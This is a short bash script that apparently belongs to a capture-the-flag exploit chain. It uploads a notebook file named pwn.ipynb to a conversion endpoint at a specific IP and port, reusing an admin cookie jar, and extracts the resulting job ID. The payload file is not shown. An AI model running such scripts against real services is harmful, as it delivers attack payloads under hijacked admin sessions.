#!/bin/bash
TARGET="http://154.57.164.74:31330"

curl -s -X POST "$TARGET/convert" \
  -c /tmp/admin_cookies.txt -b /tmp/admin_cookies.txt \
  -F "notebook=@/tmp/pwn.ipynb" \
  -F "format=markdown" \
  -D /tmp/pwn_headers.txt -o /dev/null

JOB_ID=$(grep -i 'location:' /tmp/pwn_headers.txt | grep -oP '/jobs/\K[0-9a-f]+')
echo "pwn job: $JOB_ID"